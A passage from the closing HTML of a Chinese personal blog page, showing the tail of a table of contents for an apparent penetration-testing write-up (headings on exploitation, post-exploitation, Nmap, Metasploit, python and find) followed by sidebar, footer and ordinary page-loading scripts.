          2.2：漏洞分析 &amp; 渗透攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3%EF%BC%9A%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-text">
          2.3：后渗透</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3%EF%BC%9A%E6%80%BB%E7%BB%93"><span class="toc-text">
          3：总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1%EF%BC%9A%E5%91%BD%E4%BB%A4-%E5%B7%A5%E5%85%B7"><span class="toc-text">
          3.1：命令 &amp; 工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-1%EF%BC%9ANmap"><span class="toc-text">
          3.1.1：Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-2%EF%BC%9AMetasploit"><span class="toc-text">
          3.1.2：Metasploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-3%EF%BC%9Apython"><span class="toc-text">
          3.1.3：python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-4%EF%BC%9Afind"><span class="toc-text">
          3.1.4：find</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF"><span class="toc-text">
          3.2：关键技术</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/notAlone.png" alt="avatar"></div><p class="sidebar-ov-author__text">但愿五湖明月在。</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">34</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">7</div><div class="sidebar-ov-state-item__name">分类</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022~2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>镜坛主</span></div><div>欢迎来到 —— 镜坛！</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
  var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload",".header-banner"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
  // 加载进度条的计时器
  var loadingTimer = null;

  // 重置页面 Y 方向上的滚动偏移量
  document.addEventListener('pjax:send', function () {
    $('.header-nav-menu').removeClass('show');
    if (CONFIG.pjax && CONFIG.pjax.avoidBanner) {
      $('html').velocity('scroll', {
        duration: 500,
        offset: $('#header').height(),
        easing: 'easeInOutCubic'
      });
    }

    var loadingBarWidth = 20;
    var MAX_LOADING_WIDTH = 95;

    $('.loading-bar').addClass('loading');
    $('.loading-bar__progress').css('width', loadingBarWidth + '%');
    clearInterval(loadingTimer);
    loadingTimer = setInterval(function () {
      loadingBarWidth += 3;
      if (loadingBarWidth > MAX_LOADING_WIDTH) {
        loadingBarWidth = MAX_LOADING_WIDTH;
      }
      $('.loading-bar__progress').css('width', loadingBarWidth + '%');
    }, 500);
  }, false);

  window.addEventListener('pjax:complete', function () {
    clearInterval(loadingTimer);
    $('.loading-bar__progress').css('width', '100%');
    $('.loading-bar').removeClass('loading');
    setTimeout(function () {
      $('.loading-bar__progress').css('width', '0');
    }, 400);
    $('link[rel=prefetch], script[data-pjax-rm]').each(function () {
      $(this).remove();
    });
    $('script[data-pjax], #pjax-reload script').each(function () {
      $(this).parent().append($(this).remove());
    });

    if (Stun.utils.pjaxReloadBoot) {
      Stun.utils.pjaxReloadBoot();
    }
    if (Stun.utils.pjaxReloadScroll) {
      Stun.utils.pjaxReloadScroll();
    }
    if (Stun.utils.pjaxReloadSidebar) {
      Stun.utils.pjaxReloadSidebar();
    }
    if (false) {
      if (Stun.utils.pjaxReloadHeader) {
        Stun.utils.pjaxReloadHeader();
      }
      if (Stun.utils.pjaxReloadScrollIcon) {
        Stun.utils.pjaxReloadScrollIcon();
      }
      if (Stun.utils.pjaxReloadLocalSearch) {
        Stun.utils.pjaxReloadLocalSearch();
      }
    }
  }, false);
}, false);</script><div id="pjax-reload"></div><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/web-effect-click.js?v=2.8.0"></script><script src="/js/web-effect-flower.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script></body></html>